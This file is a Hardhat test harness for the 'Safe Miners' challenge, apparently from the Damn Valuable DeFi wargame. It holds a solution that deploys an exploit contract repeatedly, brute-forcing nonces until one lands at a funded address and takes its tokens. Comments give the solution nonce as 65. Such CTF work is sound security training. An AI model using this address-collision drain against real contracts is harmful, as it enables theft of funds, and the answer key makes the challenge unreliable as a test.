const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Safe Miners", function () {
  let deployer, attacker;

  const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther("2000042");
  const DEPOSIT_ADDRESS = "0x79658d35aB5c38B6b988C23D02e0410A380B8D5c";

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deposit the DVT tokens to the address
    await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

    // Ensure initial balances are correctly set
    expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(
      DEPOSIT_TOKEN_AMOUNT
    );
    expect(await this.token.balanceOf(attacker.address)).eq("0");
  });

  it("Exploit", async function () {
    // Thread that helped: https://twitter.com/rstormsf/status/1534977598505115648
    // Essentially the DEPOSIT_ADDRESS is based on a nonce that was not used
    // So it is possible to brute force the nonces
    // and see if the address produced by creating a new vulnerable smart contract
    // is the same as DEPOSIT_ADDRESS
    // Solution nonce according to the logs is 65

    this.timeout(0);
    for (let nonce = 0; nonce < 100; nonce++) {
      await (
        await ethers.getContractFactory("ExploitMiners", attacker)
      ).deploy(attacker.address, this.token.address, 100);
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    // The attacker took all tokens available in the deposit address
    expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      DEPOSIT_TOKEN_AMOUNT
    );
  });
});
